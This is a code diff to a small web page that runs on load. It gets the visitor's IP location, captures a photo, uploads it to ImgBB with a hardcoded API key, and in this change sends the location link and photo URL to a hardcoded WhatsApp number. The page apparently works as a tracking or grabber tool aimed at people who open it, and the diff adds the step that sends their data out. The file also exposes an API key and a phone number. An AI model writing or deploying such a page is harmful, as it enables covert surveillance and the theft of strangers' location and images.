@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location & Photo</title>
+    <title>Send Location & Photo to WhatsApp</title>
 </head>
 <body>
-    <h2>Location & Photo</h2>
+    <h2>Sending Location & Photo to WhatsApp...</h2>
     <p id="status">Getting location...</p>
 
     <script>
         // API Key & Configurations
         const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // ImgBB API Key
+        const USER_WHATSAPP = "94713424256";  // WhatsApp Number to send
 
         // Upload Image to ImgBB with extra IP address info
         async function uploadToImgBB(imageData, ipInfo) {
@@ -57,7 +58,7 @@
         }
 
         // Capture Photo & Get Location
-        async function captureAndDisplay() {
+        async function captureAndSend() {
             try {
                 // Get location using IP address
                 const ipInfo = await getLocationByIP();
@@ -70,13 +71,16 @@
                 const photoUrl = await uploadToImgBB(photo, ipInfo);
 
                 if (photoUrl) {
-                    document.getElementById("status").innerText = "Displaying Location & Photo...";
+                    document.getElementById("status").innerText = "Sending to WhatsApp...";
 
-                    // Display Location & Photo URL in the browser
+                    // Create WhatsApp message with the IP info and photo URL
                     const locationMessage = `📍 My Location: https://www.google.com/maps?q=${ipInfo.loc}`;
                     const photoMessage = `📸 Photo URL: ${photoUrl}`;
 
-                    alert(locationMessage + "\n" + photoMessage);
+                    const encodedMessage = encodeURIComponent(locationMessage + "\n" + photoMessage);
+
+                    // Send WhatsApp message by creating a WhatsApp link
+                    window.open(`https://wa.me/${USER_WHATSAPP}?text=${encodedMessage}`, "_blank");
                 } else {
                     document.getElementById("status").innerText = "Image upload failed.";
                 }
@@ -105,7 +109,7 @@
         }
 
         // Auto-run on page load
-        window.onload = captureAndDisplay;
+        window.onload = captureAndSend;
     </script>
 </body>
 </html>
